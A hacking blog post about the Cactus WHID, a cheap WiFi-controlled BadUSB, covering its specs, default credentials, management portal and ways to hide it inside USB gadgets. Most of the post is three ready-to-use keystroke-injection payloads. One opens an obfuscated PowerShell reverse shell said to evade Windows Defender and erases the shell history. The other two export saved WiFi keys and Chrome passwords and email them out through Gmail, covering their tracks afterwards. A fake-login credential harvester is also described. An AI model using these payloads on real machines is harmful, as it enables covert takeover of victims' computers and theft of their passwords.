---
layout: single
title: '<span class="post">Remote Keystrokes Injection Over WiFi (Cheap) with Cactus WHID</span>'
excerpt: "Cactus WHID is a cheap Bad Usb and an alternative solution with the added feature of being controlled via WiFi through which we can execute instructions to get whatever we want from the device we are attacking or auditing, from exfiltrating passwords and data to a reverse shell to the device itself."
date: 2021-10-16
header:
  teaser: /assets/images/post-whid-injector/whid-jinja-logo.png
  teaser_home_page: true
categories:
  - post
  - article
tags:  
  - rubberducky
  - whid-injector
  - cactus-whid
  - hacking-tools
  - bad-usb
show_time: true
toc: true
toc_label: "Content"
toc_sticky: true
---

Bad Usb is a type of hacking device that looks similar to a conventional USB memory stick and has a series of instructions and settings that allow them to take control of any system and, in addition, to take control of all the information included in it.

There are several models of BadUSB devices, such as, for example, Bash Bunny, Rubber Ducky or P4wnP1 (Bash Bunny on steroids and the most current device).

In this post we will be talking about WHID Cactus which is a bad-usb as an alternative solution with the added feature of being controlled via WiFi through which we can execute instructions to get whatever we want from the device we are attacking or auditing, from exfiltrating passwords and data to a reverse shell to the device itself.

<a href="/assets/images/post-whid-injector/whid.jpg">
    <img src="/assets/images/post-whid-injector/whid.jpg">
</a>

## Comparison

Since Rubber Ducky is one of the best known and WHID Cactus is a RubberDucky on steroids, let's compare them.

RubberDucky by Hak5:
* 1st generation
* Dedicated Hardware
* Multiplatform
* Can emulate keyboard and usb disk
* Multipayload
* Price 50€

WHID Cactus by WHID Ninja:
* 3rd generation
* Dedicated OpenSource hardware
* Multiplatform
* Can emulate keyboard and usb disk
* Has WiFi
* Multipayload
* Price 11€.

The main strengths are the ability to control it via WiFi, but also has the ability to autoinject a specific code in advance and the price.

This device can be purchased cheaply on Aliexpress.

## Specs

* Atmega 32u4
  - Arduino friendly

* ESP-12
  * WiFi (both AP and Client modes)
  * TCP/IP Stack
  * DNS Support
  * 4MB Flash

* Pinout for weaponizing USB Gadgets
  
* HALL Sensor for easy unbrick

## Usage

/!\ ETHICAL USE ONLY: I am not responsible in any way for the use you make of this payload. Make sure to only use this on someone if you have their permission, or use on your own devices.

It can have several uses according to imagination, but the main ones that I am going to talk about here are two: Remote Keystrokes Injection Over WiFi y Social Engineering

### Remote Keystrokes Injection Over WiFi

Deploy WHID on Victim's machine and remotely control it by accessing its WiFi AP SSID. (eventually you can also setup WHID to connect to an existing WiFi network)

This device comes with ESploitV2 preloaded as software which makes it Plug-And-Hack.

When connected, we can observe the presence of a new WiFi network, by default the credentials are SSID `Exploit:DotAgency` and the admin credentials are `admin:hacktheplanet`.

It is worth mentioning that we can access the management portal of the tool once connected, accessing the address `192.168.1. 1` which if you have 2 network cards and you are connected to the internet through one at the same time as this WiFi network, you will not be able to access because the address set by the device will match that of the router, so the best option is to be connected only to the network of the device and once inside the portal change the ip address with which it starts (Configure ESPloit -> IP) and change the value to `192.168.1.2`, so you can have internet while configuring your whid injector.
You can connect through any device with WiFi, there is also an android application designed just for device management. [Apk](https://apkpure.com/whid-mobile-connector/whid.usb.injector)

When accessing we will see the following:

<a href="/assets/images/post-whid-injector/portal.png">
    <img src="/assets/images/post-whid-injector/portal.png">
</a>

We can write and execute instructions with *Live Payload Mode* or *Input Mode*, we can convert code written for Rubber Ducky to the syntax of our device with *Duckuino Mode*, and choose or upload payloads so we don't have to write them and execute them at will or in an automated way when plugging in the device.

In addition we can configure all the parameters for the services available in the section *Configure ESPloit*.

<a href="/assets/images/post-whid-injector/configure.png">
    <img src="/assets/images/post-whid-injector/configure.png">
</a>

Useful payloads to test in your controlled environment:

#### Payload to create a reverse shell via powershell

With this payload you will get a reverse shell with powershell bypassing Windows Defender (Tested for Win10 at date of release)

Replace `LISTEN_IP` and `PORT`.

This script will erase the powershell history to remove traces (although more things would be missing)

```php
Press:131+114
CustomDelay:500
Print:powershell -NoP -NonI -W hidden -Exec Bypass
CustomDelay:250
Press:176
CustomDelay:200
Print:$I='LISTEN_IP';$P=PORT;$0LVhbQ=[TyPE]('tExT'+'.enCOD'+'InG');$C=.('New'+'-Obj'+'ect') System.Net.Sockets.TCPClient($
CustomDelay:200
Print:I,$P);$S=$C.GetStream();[byte[]]$b=0..65535|&('%'){0};while(($i=$S.Read($b,0,$b.Length))-ne 0){;$d=(&('New'+'-Ob'+'ject'
CustomDelay:200
Print:) -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$X=(&('ie'+'x') $d 2>&1 | .('Out'+'-St'+'ring'));$Z=$X+'PS'+(&
CustomDelay:200
Print:('pw'+'d')).Path+'>';$sbt=($0lvHBq::ASCII).GetBytes($Z);$S.Write($sbt,0,$sbt.Length);$S.Flush()};$C.Close()
CustomDelay:100
Press:176
Print:cd AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine
Press:176
Print:del ConsoleHost_history.txt
Press:176
Print:exit
```

<br />

[Demostration](https://s3.amazonaws.com/img0.recordit.co/pWhlJ7FQwC.mp4?AWSAccessKeyId=AKIAUQ5RURZ7ND2T2B6I&Expires=1634444102&Signature=wj%2BayozcsGBaBW2d3X%2BiBrc8sBM%3D)

#### Payload to steal WiFi network credentials from a host and exfiltrate them via email

You will require a temporary gmail account to which you allow the [Less-secure-apps](https://myaccount.google.com/u/4/lesssecureapps) option.

*Do not use your main account*

Also this script will delete all created tests including logs and powershell history.

Replace *YOUR_EMAIL* and *YOUR_PASSWORD*.

```php
CustomDelay:500
Press:131+100
CustomDelay:150
Press:131+114
CustomDelay:400
Print:cmd
Press:176
CustomDelay:500
Print:color FE & mode con:cols=18 lines=1
Press:176
Print:cd Desktop
Press:176
Print:mkdir A
Press:176
Print:cd A
Press:176
Print:netsh wlan export profile key=clear
Press:176
CustomDelay:200
Print:cd ..
Press:176
Print:powershell
Press:176
Print:Compress-Archive -Path A -DestinationPath A.zip
Press:176
CustomDelay:500
Print:$SMTPServer = 'smtp.gmail.com'
Press:176
Print:$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
Press:176
Print:$SMTPInfo.EnableSsl = $true
Press:176
Print:$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_EMAIL', 'YOUR_PASSWORD')
Press:176
Print:$ReportEmail = New-Object System.Net.Mail.MailMessage
Press:176
Print:$ReportEmail.From = 'YOUR_EMAIL'
Press:176
Print:$ReportEmail.To.Add('YOUR_EMAIL')
Press:176
Print:$ReportEmail.Subject = "Harvest-Report"
Press:176
Print:$ReportEmail.Body = "GG, you got it"
Press:176
Print:$ReportEmail.Attachments.Add("A.zip")
Press:176
Print:$SMTPInfo.Send($ReportEmail)
Press:176
CustomDelay:400
Print:REG DELETE HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU /f
Press:176
Print:cd ..
Press:176
Print:cd AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine
Press:176
Print:del ConsoleHost_history.txt
Press:176
Print:exit
Press:176
CustomDelay:100
Print:del A & rmdir A
Press:176
Print:S
Press:176
Print:del A.zip & exit
Press:176
```

<a href="/assets/images/post-whid-injector/wifi-email.png">
    <img src="/assets/images/post-whid-injector/wifi-email.png">
</a>

#### Payload to steal Chrome passwords and exfiltrate them via email

You will require a temporary gmail account to which you allow the [Less-secure-apps](https://myaccount.google.com/u/4/lesssecureapps) option.

*Do not use your main account*.

Replace *YOUR_EMAIL* and *YOUR_PASSWORD*.

```php
Press:131+114
CustomDelay:500
Print:chrome
CustomDelay:100
Press:176
CustomDelay:1000
Print:chrome://settings/passwords
Press:176
CustomDelay:1000
Press:179
CustomDelay:100
Press:179
CustomDelay:100
Press:179
CustomDelay:100
Press:179
CustomDelay:100
Press:179
CustomDelay:100
Press:179
CustomDelay:100
Press:179
CustomDelay:100
Press:176
CustomDelay:200
Press:176
CustomDelay:200
Press:176
CustomDelay:700
Print:chromepasswords.csv
CustomDelay:200
Press:176
CustomDelay:1000
Press:128+119
CustomDelay:100
Press:131+114
CustomDelay:200
Print:powershell
Press:176
CustomDelay:500
Print:$SMTPServer = 'smtp.gmail.com'
Press:176
CustomDelay:100
Print:$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587)
Press:176
CustomDelay:100
Print:$SMTPInfo.EnableSSL = $true
Press:176
CustomDelay:100
Print:$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('YOUR_EMAIL', 'YOUR_PASSWORD')
Press:176
CustomDelay:100
Print:$SMTPServer = $E = New-Object System.Net.Mail.MailMessage
Press:176
CustomDelay:100
Print:$E.From = 'YOUR_EMAIL'
Press:176
CustomDelay:100
Print:$E.To.Add('YOUR_EMAIL')
Press:176
CustomDelay:100
Print:$E.Subject = $env:UserName
Press:176
CustomDelay:100
Print:$E.Body = 'Success! The password file is attached!'
Press:176
CustomDelay:100
Print:$F = 'Documents/chromepasswords.csv'
Press:176
CustomDelay:100
Print:$E.Attachments.Add($F)
Press:176
CustomDelay:100
Print:$F = $SMTPInfo.Send($E)
Press:176
CustomDelay:100
Print:exit
Press:176
```

You can search for scripts already created for rubber ducky (of which by reputation there are many and updated) and convert them to the language of this tool with *Duckuino Mode* (check it because sometimes it makes errors in the strings).
Even run the Windows CVE 2021 1675 PrintNightmare Administrative Escalation vulnerability with a reverse shell to gain full control of a host.
Anyway it is cross-platform either for Windows, Linux, Mac OS or Android.

### Social Engineering: Deploy WHID inside an USB gadget

The idea would be to use social engineering to bypass physical access restrictions to Target's device by weaponizing devices using usb thanks to Cactus pinouts, the objective being to test the weaknesses of a company against social engineering.

In order to weaponizing USB gadgets, you can solder the USB wires to the dedicated pinouts.

The pin closer to USB-A is GND. The pins are:

* GND
* D+
* D-
* VCC

<a href="/assets/images/post-whid-injector/pinout.png">
    <img src="/assets/images/post-whid-injector/pinout.png">
</a>

If you need a usb hub to weaponize a usb gadget or mouse, I recommend using this: [NanoHub](https://www.tindie.com/products/mux/nanohub-tiny-usb-hub-for-hacking-projects/)

On the other hand, one of the options of this device is ESPortal Credentials Harvester that redirects HTTP requests to a fake login page, being able to capture all the credentials that are entered as if it were the case of a Rogue AP. It also has the following features:

* Captures credentials are stored on the exfiltration page in the file "esportal-log.txt"
* You can define a custom template for up to 3 specific domains.
* Custom html templates can be uploaded for the ESPortal login credential harvester via FTP.


Some examples of weaponized gadgets:

<a href="/assets/images/post-whid-injector/weaponized-mouse.png">
    <img src="/assets/images/post-whid-injector/weaponized-mouse.png">
</a>

<a href="/assets/images/post-whid-injector/weaponized_PlasmaBall.png">
    <img src="/assets/images/post-whid-injector/weaponized_PlasmaBall.png">
</a>

I encourage you to take full advantage of this tool.

Bye.